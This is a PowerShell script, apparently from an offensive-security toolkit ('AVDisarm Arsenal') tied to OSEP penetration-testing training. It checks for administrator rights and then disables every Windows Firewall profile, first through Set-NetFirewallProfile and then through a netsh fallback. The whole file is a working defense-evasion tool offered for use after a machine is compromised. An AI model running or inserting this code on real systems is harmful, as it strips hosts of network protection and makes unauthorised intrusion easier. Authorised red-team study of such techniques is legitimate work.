<#
.SYNOPSIS
    OSEP Firewall Disarmer (PowerShell)
    Part of the AVDisarm Arsenal.
    Requires High Integrity (Local Admin).
#>

Write-Host "[*] OSEP Firewall Disarmer (PowerShell)" -ForegroundColor Cyan

# 1. Check Integrity
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] ERROR: High Integrity (Admin) is required to disable the firewall." -ForegroundColor Red
    return
}

# 2. Disable Profiles
Write-Host "[*] Disabling all firewall profiles..." -ForegroundColor Gray
try {
    # Attempt using modern cmdlets
    Set-NetFirewallProfile -All -Enabled False -ErrorAction Stop
    Write-Host "[+] Successfully disabled via Set-NetFirewallProfile." -ForegroundColor Green
} catch {
    Write-Host "[!] Cmdlets failed or missing. Falling back to netsh..." -ForegroundColor Yellow
    netsh advfirewall set allprofiles state off
    if ($LASTEXITCODE -eq 0) {
        Write-Host "[+] Successfully disabled via netsh." -ForegroundColor Green
    } else {
        Write-Host "[-] FAILED to disable firewall." -ForegroundColor Red
    }
}

# 3. Report Status
Write-Host "`n[*] Current Firewall Status:" -ForegroundColor Cyan
try {
    Get-NetFirewallProfile | Select-Object Name, Enabled | Format-Table
} catch {
    netsh advfirewall show allprofiles | Select-String "State"
}
